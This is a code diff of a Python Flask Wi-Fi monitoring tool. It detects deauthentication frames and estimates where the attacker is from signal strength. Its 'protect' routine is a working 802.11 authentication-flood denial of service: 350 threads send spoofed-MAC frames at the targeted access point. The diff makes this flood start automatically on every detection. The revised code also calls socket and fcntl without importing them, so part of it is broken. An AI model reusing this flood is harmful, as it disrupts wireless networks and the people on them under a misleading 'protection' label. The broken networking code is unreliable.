@@ -25,14 +25,14 @@ def check_and_install_modules():
 
 check_and_install_modules()
 
-import subprocess
+import os
+from threading import Thread
 import threading
 import time
 import logging
 from datetime import datetime, timedelta
-from scapy.all import *
 from flask import Flask, render_template_string, request, jsonify, current_app
-from scapy.all import Dot11Deauth, sniff, RadioTap, Dot11, Dot11Auth, sendp, Dot11Beacon
+from scapy.all import sniff, Dot11Deauth, RadioTap, Dot11, Dot11Auth, sendp, Dot11Beacon
 from playsound import playsound
 import random
 import string
@@ -42,17 +42,10 @@ import struct
 import requests
 import json
 import numpy as np
-import socket
-import ipaddress
 
-
+# Configure logging
 logging.basicConfig(filename='wifi_monitor.log', level=logging.DEBUG, format='%(asctime)s %(levelname)s: %(message)s')
-logger = logging.getLogger(__name__)
-logger.setLevel(logging.INFO)
-
-ALERT_COOLDOWN = 15
-last_alert_time = 0
-
+logger = logging.getLogger()
 attacks = {
     "deauth": [],
     "auth": [],
@@ -61,17 +54,27 @@ attacks = {
 }
 played_alerts = set()
 sniff_thread = None
+a_p = False  # Auto protection flag
 bssid_under_attack = None
+previous_bssid = ""
 app = Flask(__name__)
-
+last_attack_time = {}
+ALERT_COOLDOWN = 15
+last_alert_time = 0
 
 url = "https://www.oref.org.il/warningMessages/alert/History/AlertsHistory.json"
 file_path = "alerts_history.json"
-delay_seconds = 5 
+delay_seconds = 5  # Delay in seconds between each fetch and send operation
+
+try:
+    with open('website.html', 'r') as file:
+        MAP_HTML = file.read()
+    logger.debug("Website template loaded successfully.")
+except Exception as e:
+    logger.error(f"Error loading website template: {e}")
+    MAP_HTML = ""
 
 
-with open('website.html', 'r') as file:
-    MAP_HTML = file.read()
 
 @app.route('/clear_logs', methods=['POST'])
 def clear_logs():
@@ -84,11 +87,11 @@ def clear_logs():
         logger.error(f"Error clearing logs: {e}")
         return jsonify(status="error")
 
-
 def average_rssi(rssi_values):
     return np.mean(rssi_values)
 
 def signal_strength_decay(rssi, band='2.4GHz'):
+    # Adjust decay factor for 5GHz if necessary
     decay_factor = 2 if band == '5GHz' else 3
     return 10 ** ((-rssi - 30) / (10 * decay_factor))
 
@@ -148,7 +151,6 @@ def extract_essid_from_bssid(bssid, iface="wlan0", timeout=10):
         logger.error(f"BSSID {bssid} not found in the sniffed data")
         return None
 
-
 @app.route('/current_alert', methods=['GET'])
 def current_alert():
     try:
@@ -160,7 +162,11 @@ def current_alert():
                     essid = essid_rssi_data["essid"]
                     rssi = essid_rssi_data["rssi"]
                     source = essid_rssi_data["source"]
+
+                    # Determine band if available
                     band = '5GHz' if '5GHz' in essid else '2.4GHz'
+
+                    # Calculate proximity and location
                     proximity, distance = determine_attacker_proximity([rssi], band)
                     location, _ = determine_attacker_location([rssi], band)
                     message = f"{latest_attack[1]} from {source} detected:\n BSSID: {latest_attack[2]}\n ESSID: {essid}\n RSSI: {rssi} dBm\n {proximity}\n Distance: {distance:.2f} meters\n Location: {location}"
@@ -173,8 +179,6 @@ def current_alert():
         logger.error(f"Error retrieving current alert: {e}")
         return jsonify(alert={"message": "An error occurred while retrieving the alert", "type": "red"})
 
-
-a_p = False
 @app.route('/auto_protect', methods=['POST'])
 def auto_protect():
     """Enable or disable auto protection for the last attacked Wi-Fi network."""
@@ -193,46 +197,43 @@ def auto_protect():
 
 @app.route('/protect_wifi', methods=['POST'])
 def protect_wifi():
-    """Protect the last attacked Wi-Fi network."""
+    """Start an authentication DoS attack to protect the Wi-Fi network under attack."""
     global bssid_under_attack
-
-    try:
-        if bssid_under_attack:
-            iface = 'wlan0'
-            
-            if iface:
-                with app.app_context():
-                    threading.Thread(target=start_auth_dos, args=(bssid_under_attack, iface)).start()
-                    return jsonify({'status': 'success', 'message': f'protected'}), 200
-            else:
-                logger.error("Interface not provided")
-                return jsonify({'status': 'error', 'message': 'Interface not provided'}), 400
- 
-        logger.warning("No attack detected. Protection not started.")
-        return jsonify({'status': 'error', 'message': 'No attack detected'}), 400
-
-    except Exception as e:
-        logger.exception("Error while starting protection.")
-        return jsonify({'status': 'error', 'message': str(e)}), 400
+    if bssid_under_attack:
+        iface = 'wlan0'
+        if iface:
+            with app.app_context():
+                threading.Thread(target=start_auth_dos, args=(bssid_under_attack, iface)).start()
+            return jsonify({'status': 'success', 'message': f'Protection started for BSSID {bssid_under_attack}'}), 200
+        return jsonify({'status': 'error', 'message': 'Interface not provided'}), 303
+    return jsonify({'status': 'error', 'message': 'No attack detected'}), 303
 
 
 def detect_attack_patterns(packet):
     """Detect attack patterns and start auto protection."""
-    global attacks, last_alert_time
+    global attacks, bssid_under_attack, last_alert_time
 
     if packet.haslayer(Dot11Deauth):
-        bssid = packet[Dot11].addr2 
+        bssid = packet[Dot11].addr2
         current_time = time.time()
+
         if bssid not in [attack[2] for attack in attacks["deauth"]]:
             attacks["deauth"].append((datetime.now(), "Deauth attack", bssid))
+            bssid_under_attack = bssid  
+            logger.info(f"bssid_under_attack Updated: {bssid_under_attack}")
             logger.info(f"Deauthentication attack detected: {bssid}")
-            if a_p:
-                threading.Thread(target=protect_wifi).start()
+            
+            if bssid_under_attack:
+                with app.app_context():  
+                    threading.Thread(target=protect_wifi).start()  
+
             if current_time - last_alert_time < ALERT_COOLDOWN:
                 return
-            threading.Thread(target=playsound, args=('detect.m4a',)).start()
+
+            # Play sound alert if needed
+            threading.Thread(target=playsound, args=('detect.m4a',)).start()  
             last_alert_time = current_time
-        
+
 @app.route('/')
 def index():
     return render_template_string(MAP_HTML)
@@ -256,13 +257,10 @@ def start_sniffing():
         if iface:
             start_sniffing_thread(iface)
             return jsonify(status="Sniffing started")
-        else:
-            logger.error("No interface provided for sniffing.")
-            return jsonify(status="Error", message="No network interface provided. Please select a valid interface."), 400
+        return jsonify(status="Interface not provided"), 400
     except Exception as e:
         logger.error(f"Error starting sniffing: {e}")
-        return jsonify(status="Error", message="Failed to start sniffing. Please check the interface and try again."), 500
-
+        return jsonify(status="Error starting sniffing"), 500
 
 @app.route('/stop_sniffing', methods=['POST'])
 def stop_sniffing():
@@ -277,108 +275,40 @@ def stop_sniffing():
         logger.error(f"Error stopping sniffing: {e}")
         return jsonify(status="Error stopping sniffing"), 500
 
-def run_command(command):
-    """Run a shell command and return the output."""
-    result = subprocess.run(command, capture_output=True, text=True)
-    return result.stdout
-
-def check_and_fix_interface(iface_name):
-    """Check and fix the network interface if needed."""
-    try:
-        iface_status = run_command(['ip', 'link', 'show', iface_name])
-        
-        if not iface_status:
-            logger.error(f"No such interface: {iface_name}")
-            return jsonify(status="Error", message=f"Interface '{iface_name}' does not exist. Please check the interface name."), 400
-        
-        if 'state UP' not in iface_status:
-            logger.error(f"Interface {iface_name} is down. Attempting to bring it up.")
-            run_command(['sudo', 'ip', 'link', 'set', iface_name, 'up'])
-        
-        if 'Mode:monitor' not in iface_status:
-            logger.error(f"Interface {iface_name} is not in monitor mode. Setting monitor mode.")
-            run_command(['sudo', 'iw', 'dev', iface_name, 'set', 'type', 'monitor'])
-        
-        logger.info(f"Interface {iface_name} is ready and in monitor mode.")
-        return jsonify(status="Success", message=f"Interface '{iface_name}' is ready for sniffing.")
-    
-    except Exception as e:
-        logger.error(f"Error checking or fixing interface {iface_name}: {e}")
-        return jsonify(status="Error", message=f"Failed to check or fix interface '{iface_name}'. {str(e)}"), 500
 
 def start_sniffing_thread(iface_name):
-    """Start packet sniffing in a separate thread."""
     global sniff_thread
-
-    def sniff_loop(app_context):
-        with app_context:  # Use the passed app context
-            while True:
-                try:
-                    if check_and_fix_interface(iface_name):
-                        sniff_thread = threading.Thread(target=sniff, kwargs={'iface': iface_name, 'prn': detect_attack_patterns, 'store': 0})
-                        sniff_thread.daemon = True
-                        sniff_thread.start()
-                        sniff_thread.join()
-                    else:
-                        logger.error(f"Failed to fix interface {iface_name}. Retrying in 1 second.")
-                except Exception as e:
-                    logger.error(f"Error during sniffing: {e}")
-                time.sleep(1)
-
-    app_context = app.app_context()  # Create application context
-    sniff_thread = threading.Thread(target=sniff_loop, args=(app_context,))
+    def sniff_loop():
+        while True:
+            try:
+                sniff(iface=iface_name, prn=detect_attack_patterns, store=0)
+            except Exception as e:
+                logger.error(f"Error during sniffing: {e}")
+                time.sleep(5)
+    sniff_thread = threading.Thread(target=sniff_loop)
     sniff_thread.daemon = True
     sniff_thread.start()
     logger.info(f"Sniffing started on interface {iface_name}")
 
-# Lock to ensure that multiple threads don't perform the attack simultaneously
-attack_time_lock = threading.Lock()
-
-# Store the last attack time for each BSSID
-last_attack_time = {}
-
 def start_auth_dos(bssid, iface_name):
-    """Perform Authentication DoS attack by sending fake authentication frames."""
-    
     def get_random_mac():
-        """Generate a random MAC address."""
-        return ':'.join([''.join(random.choices('0123456789ABCDEF', k=2)) for _ in range(6)]).upper()
+        return ':'.join([''.join(random.choices(string.hexdigits, k=2)) for _ in range(6)]).upper()
 
     def send_auth_frame():
-        """Send a fake authentication frame."""
         try:
-            # Ensure that BSSID and iface_name are valid
-            if not bssid or not iface_name:
-                logging.error(f"Invalid BSSID or interface: bssid={bssid}, iface_name={iface_name}")
-                return
-
-            # Generate a random fake MAC address
             fake_mac = get_random_mac()
-            logging.debug(f"Generated fake MAC: {fake_mac}")
-
-            # Create the fake authentication frame
             auth_frame = RadioTap() / Dot11(addr1=bssid, addr2=fake_mac, addr3=bssid) / Dot11Auth(seqnum=1, status=0)
-
-            # Send the frame
             sendp(auth_frame, iface=iface_name, verbose=False)
-            logging.debug(f"Sent Auth frame to BSSID: {bssid} with fake MAC: {fake_mac}")
-        
         except Exception as e:
-            logging.error(f"Error sending frame: {e}, BSSID: {bssid}, Interface: {iface_name}")
+            logging.error(f"Error sending frame: {e}")
 
     current_time = time.time()
-    
-    # Ensure that the attack is not repeated within 20 seconds
-    with attack_time_lock:
-        if bssid in last_attack_time and (current_time - last_attack_time[bssid]) < 20:
-            logging.info(f"Skipping Auth DoS on BSSID {bssid}. Attack already performed recently.")
-            return
+    if bssid in last_attack_time and (current_time - last_attack_time[bssid]) < 20:
+        logging.info(f"Skipping Auth DoS on BSSID {bssid}. Attack already performed recently.")
+        return
 
-        last_attack_time[bssid] = current_time
-
-    num_threads = 350  # Number of threads for the attack
+    num_threads = 350  
     logging.info(f"Starting Auth DoS on BSSID {bssid} with {num_threads} threads...")
-
     threads = []
     for _ in range(num_threads):
         thread = threading.Thread(target=send_auth_frame, daemon=True)
@@ -387,10 +317,21 @@ def start_auth_dos(bssid, iface_name):
 
     for thread in threads:
         thread.join()
-
+    
+    last_attack_time[bssid] = current_time
     logging.info(f"Auth DoS on BSSID {bssid} completed.")
-
-
+   
+def get_ip_address(interface):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        return socket.inet_ntoa(fcntl.ioctl(
+            s.fileno(),
+            0x8915,  # SIOCGIFADDR
+            struct.pack('256s', interface[:15].encode('utf-8'))
+        )[20:24])
+    except IOError:
+        return None
+    
 def fetch_data(url):
     """Fetch data from the specified URL and return the JSON response."""
     try:
@@ -417,7 +358,6 @@ def save_data(file_path, data):
         file.write(data)
         
 def update_alert_data(file_path, new_data):
-    """Update the alert data file with new data if it has changed."""
     logger.debug("Updating alert data...")
     existing_data = load_existing_data(file_path)
     new_data_str = json.dumps(new_data, indent=4, ensure_ascii=False)
@@ -440,44 +380,13 @@ def get_alerts():
     logger.debug("No alerts data found")
     return jsonify([])
 
-@app.route('/')
-def serve_map():
-    return render_template_string('', 'indexx.html')
-
-
-def get_private_ip():
-    """Get a valid private IP address."""
-    import socket
-    import ipaddress
-    try:
-    
-        hostname = socket.gethostname()
-        ip_addresses = socket.gethostbyname_ex(hostname)[2]
-
-        for ip in ip_addresses:
-            ip_obj = ipaddress.ip_address(ip)
-            if ip_obj.is_private and not ip_obj.is_loopback:
-                return str(ip_obj)
-
-        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
- 
-            s.connect(('8.8.8.8', 1))
-            return s.getsockname()[0]
-
-    except Exception as e:
-        print(f"Error retrieving IP address: {e}")
-        return "127.0.0.1" 
-    
 def main():
     """Main function to run the Flask app."""
-    ip_address = get_private_ip()
-    
-    if ip_address is None:
-        print("Error: IP address could not be retrieved")
-    else:
-        print(f"YuB-X: Ready!\nWebsite: {ip_address}:5000\n")
+    ip_address = get_ip_address('eth0')
+    print("\nWebsite:", ip_address + ":5000\n") 
+	
     global sniff_thread
-    sniff_thread = threading.Thread(target=start_sniffing_thread, args=('wlan0',))
+    sniff_thread = Thread(target=start_sniffing_thread, args=('wlan0',))
     sniff_thread.start()
     def data_fetcher():
         while True:
@@ -495,3 +404,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
